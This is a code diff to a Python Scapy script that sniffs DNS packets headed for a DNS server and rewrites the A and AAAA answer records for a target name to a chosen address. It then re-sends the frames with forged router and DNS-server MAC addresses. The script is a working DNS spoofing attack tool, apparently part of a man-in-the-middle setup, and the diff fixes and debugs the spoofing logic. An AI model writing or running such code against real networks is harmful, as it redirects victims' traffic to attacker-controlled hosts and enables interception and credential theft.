@@ -20,19 +20,27 @@ options = {
 
 def checkpacket(packet,name): 
     try:
+        print(packet.ancount)
         for i in range(packet.ancount):
-            if (packet[DNSRR][i].type == 1 or packet[DNSRR][i].type == 28) and packet[DNSRR][i].rrname == name:
+            if (packet[DNSRR][i].type == 1 or packet[DNSRR][i].type == 28) and packet[DNSRR][i].rrname.decode(encoding="ascii")[:-1] == name:
                 yield  i 
+            else : 
+                print(packet[DNSRR][i].type )
+                print(packet[DNSRR][i].rrname.decode(encoding ="ascii"))
     except: 
         ...
 
 def throworkill(packet,name,newaddr): 
     print("entered")
     for i in  checkpacket(packet, name)  :
+        print(i)
         packet[DNSRR][i].rdata = newaddr 
+        print("*"*20)
+        packet[DNSRR][i].show()
+        print("\n"+"*"*20)
     packet[Ether].src = options["routerMac"]
     packet[Ether].dst = options["dnsmac"]
-    packet[Ether].show()
+    packet.show()
     sendp(packet,iface=options["interface"]) # if it is not the final answear we just forwarding it to he dns server
 
 
@@ -70,7 +78,7 @@ def main()->None:
 
     #sniffing dns messages
     sniff(
-        lfilter= lambda x : IP in x and x[IP].dst == options["dnsaddr"] , prn = lambda x : throworkill(x,options["name"]) )
+        lfilter= lambda x : IP in x and x[IP].dst == options["dnsaddr"] , prn = lambda x : throworkill(x,options["name"],options["addr"]) )
     tr.join()
 
 
